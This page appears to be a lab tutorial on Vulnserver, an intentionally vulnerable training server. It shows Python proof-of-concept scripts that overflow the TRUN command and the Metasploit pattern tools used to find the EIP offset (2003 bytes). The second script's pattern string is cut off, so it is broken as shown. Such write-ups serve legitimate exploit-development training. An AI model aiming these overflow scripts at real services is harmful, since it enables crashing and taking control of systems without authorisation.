---
title: "TRUN EIP Overwrite"
layout: home
minimal_mistakes_skin: "dark"
permalink: /vulnserver/trun/
collection: vulnserver
sidebar:
  nav: "main"
entries_layout: grid
classes: wide
---

Begin by using the below proof of concept script, developed by using the SPIKE fuzzer to identify a hole in the Vulnserver TRUN command.

Vulnserver TRUN Python Script: POC
```py
#!/usr/bin/python
import socket
import os
import sys

crash="A"*5000

buffer="TRUN /.:/"
buffer+=crash

print "[*] Sending evil TRUN request to VulnServer, OS-42279"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.83.128", 9999))
expl.send(buffer)
expl.close()
```

Running this POC script against Vulnserver produces the same result in the OllyDbg debugger as our previous SPIKE fuzzing attempts. As a very nice bonus, the input we sent has been used to control the value of a very important register in the CPU – the EIP (Extended Instruction Pointer) register. Notice how the EIP register contains the value 41414141?

![trun-eip-overwrite-media-01](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-01.png)

Additional testing proves that a 2500 byte buffer will also cause the Vulnserver application to crash due to an access violation. Create a 2500 byte patterned string to identify which part of the buffer is being stored in the EIP.
	> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500

Insert the 2500 character pattern into the Vulnserver TRUN POC Python Script.

Vulnserver TRUN Python Script: Pattern
```py
#!/usr/bin/python
import socket
import os
import sys

crash="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3>

buffer="TRUN /.:/"
buffer+=crash

print "Sending evil TRUN request to VulnServer, OS-42279"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.83.128", 9999))
expl.send(buffer)
expl.close()
```

Running the Vulnserver TRUN Pattern Python Script against the target system shows that the following pattern value is being stored in EIP.

# <p align="center">
# <img src="/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-02.png">
# </p>

![trun-eip-overwrite-media-02 align="center"](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-02.png)

EIP address is 386F4337. Use the Metasploit pattern offset utility to identify where the bytes are located in the 2500 byte buffer.
	 > /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 386F4337

![trun-eip-overwrite-media-03](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-03.png)

An exact match was found at offset 2003 bytes.  Modify the buffer in the POC script to now send 2003 "A" characters, 4 "B" characters, and 1993 "C" characters; this should overwrite EIP with 4 "B" characters while retaining a 4000 byte buffer size.
